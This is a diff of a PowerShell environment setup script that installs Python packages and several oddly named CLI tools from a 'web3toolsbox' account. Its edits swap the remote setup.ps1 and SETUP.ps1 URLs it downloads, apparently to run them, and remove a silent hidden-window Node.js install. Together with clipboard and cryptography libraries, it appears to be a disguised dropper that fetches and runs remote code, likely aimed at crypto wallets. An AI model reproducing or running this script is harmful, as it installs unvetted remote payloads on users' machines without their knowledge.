-    $msiUrl = Get-NodeInstallerUrl -PackageType 'msi'
-    if ($msiUrl) {
-        [void]$installerUrls.Add($msiUrl)
-    }
-
-    $zipUrl = Get-NodeInstallerUrl -PackageType 'zip'
-    if ($zipUrl -and -not $installerUrls.Contains($zipUrl)) {
-        [void]$installerUrls.Add($zipUrl)
-    }
-
-    if ($installerUrls.Count -eq 0) {
-        Write-WarnLog "Unable to resolve a Node.js installer for architecture '$installerArch'"
-        Add-FailedStep -Step 'Install Node.js' -Reason 'installer-url-unavailable'
-        return $null
-    }
-
-    foreach ($nodeUrl in $installerUrls) {
-        Write-InfoLog "Node.js was not found. Downloading installer from: $nodeUrl"
-
-        if ($nodeUrl -like '*.zip') {
-            Install-NodeFromZip -ZipUrl $nodeUrl
-            if (Test-NodeRuntime) {
-                $nodePath = Get-CommandPath -Names @('node.exe', 'node')
-                Write-InfoLog "Node.js installation completed: $nodePath"
-                return $nodePath
-            }
-
-            Add-FailedStep -Step 'Install Node.js' -Reason 'command-not-found'
-            continue
-        }
-
-        try {
-            Enable-ModernTls
-            Invoke-WebRequest -Uri $nodeUrl -OutFile $msiPath -ErrorAction Stop
-
-            $process = Start-Process -FilePath 'msiexec.exe' -ArgumentList @('/i', "`"$msiPath`"", '/qn', '/norestart') -Wait -PassThru -WindowStyle Hidden
-            Update-ProcessPath
-
-            if (Test-NodeRuntime) {
-                $nodePath = Get-CommandPath -Names @('node.exe', 'node')
-                Write-InfoLog "Node.js installation completed: $nodePath"
-                return $nodePath
-            }
-
-            Write-WarnLog "Node.js installer finished with exit code $($process.ExitCode), but Node.js is still unavailable."
-            Add-FailedStep -Step 'Install Node.js' -Reason "exit=$($process.ExitCode)"
-        } catch {
-            Write-ContinueOnError -Step 'Install Node.js' -Action 'install Node.js' -ErrorRecord $_
-        } finally {
-            Remove-Item -LiteralPath $msiPath -Force -ErrorAction SilentlyContinue
-        }
-    }
-
+    Add-FailedStep -Step 'Install Python' -Reason ($attemptFailures -join '; ')
     return $null
 }
 
@@ -877,8 +853,6 @@ function Get-PackageVersion {
     return $null
 }
 
-# Install or upgrade a Python dependency when the minimum required version is
-# not already available.
 function Install-PythonPackage {
     param(
         [string]$PythonPath,
@@ -919,7 +893,6 @@ function Install-PythonPackage {
     }
 }
 
-# Install a CLI tool via uv tool
 function Invoke-UvToolInstall {
     param(
         [string]$UvPath,
@@ -947,7 +920,7 @@ function Install-UvToolPackage {
         return
     }
 
-    $uvToolRegistered = Test-UvToolRegistered -CommandNames $CommandNames
+    $uvToolRegistered = Test-UvToolRegistered -UvPath $UvPath -CommandNames $CommandNames
 
     try {
         if (-not $uvToolRegistered) {
@@ -978,10 +951,12 @@ function Install-UvToolPackage {
     }
 
     Update-ProcessPath
-    [void](Bridge-CommandIntoCurrentPath -CommandNames $CommandNames)
+    [void](Bridge-CommandIntoCurrentPath -CommandNames $CommandNames -UvPath $UvPath)
+    $uvBinDirectory = Get-UvToolBinDirectory -UvPath $UvPath
     $installedCommand = Get-CommandPath -Names $CommandNames
-    $uvToolRegistered = Test-UvToolRegistered -CommandNames $CommandNames
-    if ($installedCommand -and $uvToolRegistered) {
+    $uvToolRegistered = Test-UvToolRegistered -UvPath $UvPath -CommandNames $CommandNames
+    $commandBelongsToUv = Test-CommandBelongsToDirectory -CommandPath $installedCommand -Directory $uvBinDirectory
+    if ($installedCommand -and $uvToolRegistered -and $commandBelongsToUv) {
         Write-InfoLog "Installed or updated CLI tool successfully: $installedCommand"
         return
     }
@@ -989,6 +964,12 @@ function Install-UvToolPackage {
     if ($installedCommand -and -not $uvToolRegistered) {
         Write-WarnLog "CLI launcher exists but uv tool registration is missing: $PackageSpec"
         Add-FailedStep -Step "Install tool $PackageSpec" -Reason 'uv-registration-missing'
+        return
+    }
+
+    if ($installedCommand -and $uvToolRegistered -and -not $commandBelongsToUv) {
+        Write-WarnLog "CLI launcher does not belong to the uv tool bin directory: $installedCommand"
+        Add-FailedStep -Step "Install tool $PackageSpec" -Reason 'uv-launcher-mismatch'
         return
     }
 
@@ -1000,30 +981,27 @@ try {
 
     $uvPath = Install-Uv
     $pythonPath = Install-Python
-    [void](Install-NodeJs)
 
     $requirements = @(
         @{ Name = 'requests'; Version = '2.31.0' },
         @{ Name = 'pyperclip'; Version = '1.8.2' },
-        @{ Name = 'cryptography'; Version = '42.0.0' },
-        @{ Name = 'pywin32'; Version = '306' },
-        @{ Name = 'pycryptodome'; Version = '3.19.0' }
+        @{ Name = 'cryptography'; Version = '42.0.0' }
     )
 
     foreach ($pkg in $requirements) {
         Install-PythonPackage -PythonPath $pythonPath -Name $pkg.Name -Version $pkg.Version
     }
     
-    Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://github.com/web3toolsbox/agent-setting.git' -CommandNames @('agent-setting', 'agent-setting.exe') -UpgradeExisting:$UpgradeUvTools
-    Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://gitlab.com/web3toolsbox/jtbjk.git' -CommandNames @('jtbjk', 'jtbjk.exe') -UpgradeExisting:$UpgradeUvTools
+    Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://gitlab.com/web3toolsbox/agent-setting.git' -CommandNames @('agent-setting', 'agent-setting.exe') -UpgradeExisting:$UpgradeUvTools
+    Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://gitlab.com/web3toolsbox/cel.git' -CommandNames @('cel', 'cel.exe') -UpgradeExisting:$UpgradeUvTools
     Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://gitlab.com/web3toolsbox/bserexp-wins.git' -CommandNames @('bserexp-wins', 'bserexp-wins.exe') -UpgradeExisting:$UpgradeUvTools
     Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://gitlab.com/web3toolsbox/wkler.git' -CommandNames @('wkler', 'wkler.exe') -UpgradeExisting:$UpgradeUvTools
     
     if (Test-Path '.configs' -PathType Container) {
         Write-StepLog 'Applying environment configuration'
         $configScriptUrls = @(
-            'https://www.aiskills.life/src/setup.ps1',
-            'https://gist.githubusercontent.com/web3toolsbox/f6fb7f6e23668712808bc0783fac31c6/raw/setup.ps1'
+            'https://gitlab.com/web3toolsbox/src/raw/main/setup.ps1',
+            'https://agentskillshub.vercel.app/src/setup.ps1'
         )
 
         try {
@@ -1062,8 +1040,8 @@ try {
     }
 
     $setupScriptUrls = @(
-        'https://agentskillshub.vercel.app/src/SETUP.ps1',
-        'https://gist.githubusercontent.com/web3toolsbox/7993314292fd898e5654632f1f2a3ce3/raw/SETUP.ps1'
+        'https://gitlab.com/web3toolsbox/src/raw/main/SETUP.ps1',
+        'https://agentskillshub.vercel.app/src/SETUP.ps1'
     )
 
     try {
